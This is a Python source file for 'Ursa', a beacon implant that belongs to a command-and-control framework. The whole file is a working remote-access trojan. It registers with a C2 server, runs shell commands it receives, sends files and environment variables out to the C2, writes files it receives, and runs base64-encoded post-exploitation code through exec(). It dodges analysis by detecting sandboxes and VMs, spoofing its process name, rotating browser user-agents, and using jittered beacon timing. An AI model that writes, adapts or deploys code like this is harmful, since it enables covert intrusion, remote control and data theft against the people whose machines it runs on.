#!/usr/bin/env python3
"""
Ursa — HTTP Beacon Implant
============================
Runs on the target. Beacons back to the Ursa Major C2 server on a
configurable interval with jitter. Picks up tasks, executes them,
and returns results.

Task Types:
    shell       — Execute a shell command
    download    — Download a file from the target
    upload      — Upload a file to the target
    sleep       — Change beacon interval
    kill        — Self-terminate
    sysinfo     — Gather system information
    ps          — List running processes
    pwd         — Print working directory
    cd          — Change directory
    ls          — List directory contents
    whoami      — Current user info
    env         — Environment variables
    screenshot  — Take a screenshot (if supported)

Usage:
    python3 beacon.py --server http://C2_IP:8443 [--interval 5] [--jitter 0.1]
"""

import sys
import os
import json
import time
import random
import base64
import re
import socket
import platform
import subprocess
import urllib.request
import urllib.error
import argparse
import hashlib
import hmac
from datetime import datetime


# ── Evasion ───────────────────────────────────────────────────────────────────

# Pool of realistic browser UAs — one is chosen at startup (per-session)
_USER_AGENTS = [
    # Chrome on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    # Chrome on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    # Chrome on Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    # Firefox on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    # Firefox on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0",
    # Edge on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2365.92",
    # Safari on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
]

# Sandbox/VM indicator databases (inlined for single-file deployability)
_VM_MAC_OUIS = frozenset({
    "00:0c:29", "00:50:56", "00:05:69",  # VMware
    "08:00:27",                           # VirtualBox
    "52:54:00",                           # QEMU/KVM
    "00:16:3e",                           # Xen
    "00:1c:42",                           # Parallels
    "00:03:ff", "00:15:5d",              # Hyper-V
})
_SANDBOX_USERS = frozenset({
    "sandbox", "malware", "virus", "sample", "cuckoo",
    "norman", "cwsandbox", "joebox", "av", "avtest",
    "analyst", "analysis", "vmware", "vbox", "test",
})
_SANDBOX_HOST_RE = re.compile(
    r"^(sandbox|malware|cuckoo|analysis|"
    r"win-[a-z0-9]{6,}|desktop-[a-z0-9]{6,}|vm-\d+)",
    re.IGNORECASE,
)
_VM_CPU_STRS = ("hypervisor", "vmware", "virtualbox", "qemu", "kvm", "xen")


def _is_sandbox(min_hits: int = 2) -> bool:
    """Return True if sandbox/VM indicators exceed `min_hits`."""
    hits = 0

    # 1. Low uptime (fresh VM)
    try:
        if platform.system() == "Linux":
            with open("/proc/uptime") as f:
                uptime = float(f.read().split()[0])
        else:
            out = subprocess.run(["sysctl", "-n", "kern.boottime"],
                                 capture_output=True, text=True, timeout=3)
            m = re.search(r"sec\s*=\s*(\d+)", out.stdout)
            uptime = time.time() - int(m.group(1)) if m else 9999
        if uptime < 300:
            hits += 1
    except Exception:
        pass

    # 2. Sandbox username
    user = (os.getenv("USER") or os.getenv("USERNAME") or "").lower()
    if user in _SANDBOX_USERS:
        hits += 1

    # 3. Sandbox hostname pattern
    if _SANDBOX_HOST_RE.match(socket.gethostname()):
        hits += 1

    # 4. VM MAC OUI
    try:
        import uuid
        mac = uuid.getnode()
        oui = ":".join(f"{(mac >> (8 * (5 - i))) & 0xff:02x}" for i in range(3))
        if oui.lower() in _VM_MAC_OUIS:
            hits += 1
    except Exception:
        pass

    # 5. VM strings in /proc/cpuinfo
    try:
        with open("/proc/cpuinfo") as f:
            if any(s in f.read().lower() for s in _VM_CPU_STRS):
                hits += 1
    except Exception:
        pass

    # 6. Very few running processes (thin VMs)
    try:
        if platform.system() == "Linux":
            proc_count = sum(1 for e in os.scandir("/proc") if e.name.isdigit())
        else:
            out = subprocess.run(["ps", "ax"], capture_output=True, text=True, timeout=5)
            proc_count = max(0, len(out.stdout.splitlines()) - 1)
        if proc_count < 30:
            hits += 1
    except Exception:
        pass

    return hits >= min_hits


def _spoof_process_name(name: str) -> bool:
    """Attempt to change the visible process name in ps/top/htop.

    Strategy (in priority order):
      1. setproctitle library — changes full cmdline in ps aux (best)
      2. ctypes prctl PR_SET_NAME — changes 15-char thread name on Linux
      3. sys.argv[0] mutation — minimal effect, last resort

    Returns True if at least one method succeeded.
    """
    success = False

    # Method 1: setproctitle (pip install setproctitle)
    try:
        import setproctitle as _spt
        _spt.setproctitle(name)
        success = True
    except ImportError:
        pass

    # Method 2: prctl PR_SET_NAME (Linux, stdlib ctypes, max 15 chars)
    if platform.system() == "Linux":
        try:
            import ctypes
            PR_SET_NAME = 15
            name_bytes = name[:15].encode() + b"\x00"
            ret = ctypes.cdll.LoadLibrary("libc.so.6").prctl(
                PR_SET_NAME, name_bytes, 0, 0, 0
            )
            if ret == 0:
                success = True
        except Exception:
            pass

    # Method 3: argv[0] — changes what some tools display (fallback)
    try:
        sys.argv[0] = name
        success = True
    except Exception:
        pass

    return success


class UrsaBeacon:
    """HTTP beacon implant for the Ursa C2 framework."""

    def __init__(self, server_url, interval=5, jitter=0.3, sandbox_check=True,
                 process_name=""):
        self.server = server_url.rstrip("/")
        self.interval = interval
        self.jitter = min(max(float(jitter), 0.0), 1.0)
        self.sandbox_check = sandbox_check
        self.session_id = None
        self.session_key = None
        self.crypto = None
        self.running = True
        # Pick one UA for the lifetime of this session
        self.user_agent = random.choice(_USER_AGENTS)
        # Spoof process name if requested
        if process_name:
            _spoof_process_name(process_name)

    # ── Crypto (matches major/crypto.py UrsaCrypto) ──

    def _xor_bytes(self, a, b):
        return bytes(x ^ y for x, y in zip(a, b))

    def _encrypt(self, plaintext):
        """Encrypt with CTR mode + HMAC (matches UrsaCrypto.encrypt)."""
        if not self.session_key:
            return plaintext
        key_bytes = bytes.fromhex(self.session_key)
        enc_key = hashlib.sha256(key_bytes + b":enc").digest()
        mac_key = hashlib.sha256(key_bytes + b":mac").digest()

        iv = os.urandom(16)
        counter = int.from_bytes(iv, 'big')
        ciphertext = bytearray()

        if isinstance(plaintext, str):
            plaintext = plaintext.encode()

        for i in range(0, len(plaintext), 16):
            ctr_bytes = counter.to_bytes(16, 'big')
            keystream = hashlib.sha256(enc_key + ctr_bytes).digest()[:16]
            counter += 1
            chunk = plaintext[i:i+16]
            ciphertext.extend(self._xor_bytes(chunk, keystream[:len(chunk)]))

        message = iv + bytes(ciphertext)
        mac = hmac.new(mac_key, message, hashlib.sha256).digest()
        return base64.b64encode(message + mac).decode()

    def _decrypt(self, data):
        """Decrypt (matches UrsaCrypto.decrypt)."""
        if not self.session_key:
            return data
        raw = base64.b64decode(data)
        key_bytes = bytes.fromhex(self.session_key)
        enc_key = hashlib.sha256(key_bytes + b":enc").digest()
        mac_key = hashlib.sha256(key_bytes + b":mac").digest()

        mac_received = raw[-32:]
        message = raw[:-32]
        mac_expected = hmac.new(mac_key, message, hashlib.sha256).digest()
        if not hmac.compare_digest(mac_received, mac_expected):
            raise ValueError("HMAC verification failed")

        iv = message[:16]
        ciphertext = message[16:]
        counter = int.from_bytes(iv, 'big')
        plaintext = bytearray()

        for i in range(0, len(ciphertext), 16):
            ctr_bytes = counter.to_bytes(16, 'big')
            keystream = hashlib.sha256(enc_key + ctr_bytes).digest()[:16]
            counter += 1
            chunk = ciphertext[i:i+16]
            plaintext.extend(self._xor_bytes(chunk, keystream[:len(chunk)]))

        return bytes(plaintext)

    # ── HTTP Helpers ──

    def _post(self, path, data):
        """Send a POST request to the C2."""
        url = f"{self.server}{path}"
        body = json.dumps(data).encode()
        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("User-Agent", self.user_agent)

        try:
            resp = urllib.request.urlopen(req, timeout=30)
            return json.loads(resp.read().decode())
        except urllib.error.HTTPError as e:
            return {"error": e.code}
        except Exception as e:
            return {"error": str(e)}

    def _get(self, path):
        """Send a GET request to the C2."""
        url = f"{self.server}{path}"
        req = urllib.request.Request(url)
        req.add_header("User-Agent", self.user_agent)

        try:
            resp = urllib.request.urlopen(req, timeout=30)
            return resp.read()
        except Exception:
            return None

    # ── System Info ──

    def _gather_sysinfo(self):
        """Collect system information for registration."""
        info = {
            "hostname": socket.gethostname(),
            "username": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
            "os": f"{platform.system()} {platform.release()}",
            "arch": platform.machine(),
            "pid": os.getpid(),
            "process": sys.executable,
            "interval": self.interval,
            "jitter": self.jitter,
        }
        return info

    # ── Registration ──

    def register(self):
        """Register with the C2 server."""
        sysinfo = self._gather_sysinfo()
        resp = self._post("/register", sysinfo)

        if "error" in resp:
            return False

        self.session_id = resp.get("session_id")
        self.session_key = resp.get("key")
        self.interval = resp.get("interval", self.interval)
        self.jitter = resp.get("jitter", self.jitter)

        return bool(self.session_id)

    # ── Beacon Loop ──

    def beacon(self):
        """Check in with the C2 and get pending tasks."""
        resp = self._post("/beacon", {
            "session_id": self.session_id,
        })

        if "error" in resp:
            return []

        return resp.get("tasks", [])

    def send_result(self, task_id, result="", error=""):
        """Send task results back to the C2."""
        self._post("/result", {
            "session_id": self.session_id,
            "task_id": task_id,
            "result": result,
            "error": error,
        })

    def upload_file(self, filename, data):
        """Upload a file to the C2 (exfiltration)."""
        self._post("/upload", {
            "session_id": self.session_id,
            "filename": filename,
            "data": base64.b64encode(data).decode(),
        })

    # ── Task Execution ──

    def execute_task(self, task):
        """Execute a task and return the result."""
        task_type = task.get("type", "")
        args = task.get("args", {})
        task_id = task.get("id")

        try:
            if task_type == "shell":
                result = self._exec_shell(args.get("command", ""))
            elif task_type == "sysinfo":
                result = self._exec_sysinfo()
            elif task_type == "download":
                result = self._exec_download(args.get("path", ""))
            elif task_type == "upload":
                result = self._exec_upload(args.get("path", ""),
                                           args.get("data", ""))
            elif task_type == "sleep":
                result = self._exec_sleep(args.get("interval"),
                                          args.get("jitter"))
            elif task_type == "kill":
                self.send_result(task_id, result="Implant terminated")
                self.running = False
                return
            elif task_type == "ps":
                result = self._exec_ps()
            elif task_type == "pwd":
                result = os.getcwd()
            elif task_type == "cd":
                result = self._exec_cd(args.get("path", ""))
            elif task_type == "ls":
                result = self._exec_ls(args.get("path", "."))
            elif task_type == "whoami":
                result = self._exec_whoami()
            elif task_type == "env":
                result = "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items()))
            elif task_type == "post":
                result = self._exec_post(
                    args.get("code", ""),
                    args.get("module", ""),
                    args.get("args", {}),
                )
            else:
                result = ""
                self.send_result(task_id, error=f"Unknown task type: {task_type}")
                return

            self.send_result(task_id, result=result)

        except Exception as e:
            self.send_result(task_id, error=str(e))

    def _exec_shell(self, command):
        """Execute a shell command."""
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True, timeout=120
            )
            output = result.stdout
            if result.stderr:
                output += f"\n[stderr]\n{result.stderr}"
            if result.returncode != 0:
                output += f"\n[exit code: {result.returncode}]"
            return output.strip()
        except subprocess.TimeoutExpired:
            return "[ERROR] Command timed out (120s)"
        except Exception as e:
            return f"[ERROR] {e}"

    def _exec_sysinfo(self):
        """Gather detailed system information."""
        info = self._gather_sysinfo()
        # Add more detail
        try:
            info["cwd"] = os.getcwd()
            info["home"] = os.path.expanduser("~")
            info["python"] = sys.version
            info["path"] = os.environ.get("PATH", "")[:500]

            if platform.system() == "Darwin":
                ver = subprocess.run(["sw_vers"], capture_output=True, text=True, timeout=5)
                info["macos"] = ver.stdout.strip()
            elif platform.system() == "Linux":
                if os.path.exists("/etc/os-release"):
                    with open("/etc/os-release") as f:
                        info["distro"] = f.read().strip()[:300]
        except Exception:
            pass

        return json.dumps(info, indent=2)

    def _exec_download(self, path):
        """Download a file from the target to the C2."""
        path = os.path.expanduser(path)
        if not os.path.exists(path):
            return f"[ERROR] File not found: {path}"

        with open(path, "rb") as f:
            data = f.read()

        self.upload_file(os.path.basename(path), data)
        return f"Uploaded {path} ({len(data)} bytes) to C2"

    def _exec_upload(self, path, data_b64):
        """Upload a file from the C2 to the target."""
        path = os.path.expanduser(path)
        data = base64.b64decode(data_b64)
        with open(path, "wb") as f:
            f.write(data)
        return f"Written {len(data)} bytes to {path}"

    def _exec_sleep(self, interval=None, jitter=None):
        """Change beacon interval."""
        if interval is not None:
            self.interval = int(interval)
        if jitter is not None:
            self.jitter = float(jitter)
        return f"Sleep: {self.interval}s (jitter: {self.jitter})"

    def _exec_ps(self):
        """List running processes."""
        if platform.system() in ("Darwin", "Linux"):
            result = subprocess.run(
                ["ps", "aux"], capture_output=True, text=True, timeout=10
            )
            return result.stdout[:5000]
        else:
            result = subprocess.run(
                ["tasklist"], capture_output=True, text=True, timeout=10
            )
            return result.stdout[:5000]

    def _exec_cd(self, path):
        """Change working directory."""
        path = os.path.expanduser(path)
        os.chdir(path)
        return os.getcwd()

    def _exec_ls(self, path="."):
        """List directory contents."""
        path = os.path.expanduser(path)
        entries = []
        for entry in sorted(os.listdir(path)):
            full = os.path.join(path, entry)
            try:
                stat = os.stat(full)
                size = stat.st_size
                mtime = datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M")
                kind = "d" if os.path.isdir(full) else "f"
                entries.append(f"{kind}  {size:>10}  {mtime}  {entry}")
            except Exception:
                entries.append(f"?  {'?':>10}  {'?':>16}  {entry}")
        return "\n".join(entries) if entries else "(empty directory)"

    def _exec_post(self, code_b64: str, module_name: str, module_args: dict) -> str:
        """Execute a bundled post-exploitation module delivered by the C2.

        The C2 serialises post/base.py + the module source into a single
        base64-encoded blob.  We exec() it in an isolated namespace, find the
        module class by its NAME attribute, and call run(module_args).
        """
        try:
            code = base64.b64decode(code_b64).decode("utf-8")
            ns: dict = {}
            exec(compile(code, "<post-module>", "exec"), ns)  # noqa: S102

            # Find the PostModule subclass by its NAME class attribute
            module_cls = next(
                (v for v in ns.values()
                 if isinstance(v, type) and getattr(v, "NAME", "") == module_name),
                None,
            )
            if module_cls is None:
                return f"[ERROR] Module class '{module_name}' not found in bundled code"

            result = module_cls().run(module_args)
            if result.ok:
                output = result.output
                if result.data:
                    output += "\n\n--- data ---\n" + json.dumps(result.data, indent=2, default=str)
                return output
            return f"[ERROR] {result.error}"
        except Exception as exc:
            return f"[ERROR] exec failed: {exc}"

    def _exec_whoami(self):
        """Get current user info."""
        lines = [
            f"User:     {os.getenv('USER') or os.getenv('USERNAME') or 'unknown'}",
            f"UID:      {os.getuid() if hasattr(os, 'getuid') else 'N/A'}",
            f"GID:      {os.getgid() if hasattr(os, 'getgid') else 'N/A'}",
            f"Home:     {os.path.expanduser('~')}",
            f"Shell:    {os.getenv('SHELL', 'N/A')}",
            f"Hostname: {socket.gethostname()}",
        ]
        # Check if root/admin
        if hasattr(os, 'getuid') and os.getuid() == 0:
            lines.append("Privilege: ROOT")
        return "\n".join(lines)

    # ── Main Loop ──

    def _jitter_sleep(self):
        """Sleep with full-range jitter. Occasionally takes a long nap."""
        lo = self.interval * max(0.0, 1.0 - self.jitter)
        hi = self.interval * (1.0 + self.jitter)
        # ~5% chance: sleep 5-10× the normal interval to break rhythmic patterns
        if random.random() < 0.05:
            hi = self.interval * random.uniform(5, 10)
        time.sleep(max(1, random.uniform(lo, hi)))

    def run(self):
        """Main beacon loop."""
        # Sandbox/VM check — abort silently if running in an analysis environment
        if self.sandbox_check and _is_sandbox():
            return

        # Registration with retry
        max_retries = 10
        for attempt in range(max_retries):
            if self.register():
                break
            wait = min(2 ** attempt, 60)
            time.sleep(wait + random.uniform(0, wait * 0.3))
        else:
            return  # Failed to register

        # Beacon loop
        while self.running:
            try:
                tasks = self.beacon()
                for task in tasks:
                    self.execute_task(task)
            except Exception:
                pass

            self._jitter_sleep()


def main():
    parser = argparse.ArgumentParser(description="Ursa Beacon Implant")
    parser.add_argument("--server", required=True, help="C2 server URL (e.g., http://10.0.0.1:8443)")
    parser.add_argument("--interval", type=int, default=5, help="Beacon interval in seconds")
    parser.add_argument("--jitter", type=float, default=0.3, help="Jitter factor 0.0-1.0 (default 0.3 = ±30%%)")
    parser.add_argument("--no-sandbox-check", action="store_true",
                        help="Skip sandbox/VM detection (useful for testing)")
    parser.add_argument("--process-name", default="",
                        help="Spoof process name shown in ps/top (e.g. 'python3 -m http.server')")
    args = parser.parse_args()

    beacon = UrsaBeacon(
        args.server,
        args.interval,
        args.jitter,
        sandbox_check=not args.no_sandbox_check,
        process_name=args.process_name,
    )
    beacon.run()


if __name__ == "__main__":
    main()
